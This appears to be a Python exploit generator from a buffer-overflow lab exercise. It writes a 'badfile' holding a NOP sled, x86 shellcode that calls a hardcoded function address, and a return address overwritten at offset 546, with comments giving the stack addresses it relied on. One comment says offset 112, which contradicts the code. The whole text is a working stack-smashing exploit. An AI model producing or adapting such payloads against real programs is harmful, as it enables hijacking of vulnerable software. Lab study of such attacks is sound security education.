import sys 
 
shellcode= ( 
"\xBB\x86\x62\x55\x56\x6A\x01\x31\xC9\x51\xFF\xD3\x6A\x09\x50\xFF\xD3\x31\xC9\x51\x50\xFF\xD3\x6A\x05\x50\xFF\xD3\x31\xC9\x51\x50\xFF\xD3\x6A\x04\x50\xFF\xD3\x6A\x08\x50\xFF\xD3").encode('latin-1') 
 
# Fill the content with NOPs 
content = bytearray(0x90 for i in range(1647)) 
# Put the shellcode at the end 
start = 1647 - len(shellcode) 
content[start:] = shellcode 
 
# Put the address at offset 112 
ret = 0xffffcf98 + 300 
content[546:550] = (ret).to_bytes(4,byteorder='little') 
 
# Write the content to a file 
with open('badfile', 'wb') as f: 
    f.write(content) 


# ebp = 0xffffcf98
# buff = 0xffffcd7a
# diff = 542
# foo add = 0x56556286